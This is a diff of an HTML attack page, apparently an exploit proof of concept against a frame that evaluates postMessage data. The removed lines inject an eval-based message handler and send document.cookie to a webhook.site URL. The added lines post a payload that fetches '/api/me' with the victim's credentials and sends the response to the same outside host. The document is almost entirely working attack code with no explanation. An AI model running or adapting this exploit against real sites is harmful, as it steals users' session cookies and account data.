@@ -2,18 +2,13 @@
 <html>
 <script>
 setTimeout(function() {
-  // First message: remove the origin check entirely
-  window.parent.frames[0].postMessage(
-    "window.onmessage=function(e){eval(e.data)}",
-    '*'
-  );
-  // Second message: steal cookies (now no origin check)
-  setTimeout(function() {
-    window.parent.frames[0].postMessage(
-      "new Image().src='https://webhook.site/f28ba19d-1aad-4ab5-9a41-a9f7c534df54?c='+encodeURIComponent(document.cookie)",
-      '*'
-    );
-  }, 1000);
-}, 2000);
+  var payload = `
+    fetch('/api/me',{credentials:'include'})
+    .then(r=>r.text())
+    .then(t=>new Image().src='https://webhook.site/f28ba19d-1aad-4ab5-9a41-a9f7c534df54?d='+encodeURIComponent(t))
+    .catch(e=>new Image().src='https://webhook.site/f28ba19d-1aad-4ab5-9a41-a9f7c534df54?err='+encodeURIComponent(e))
+  `;
+  window.parent.frames[0].postMessage(payload, '*');
+}, 3000);
 </script>
 </html>
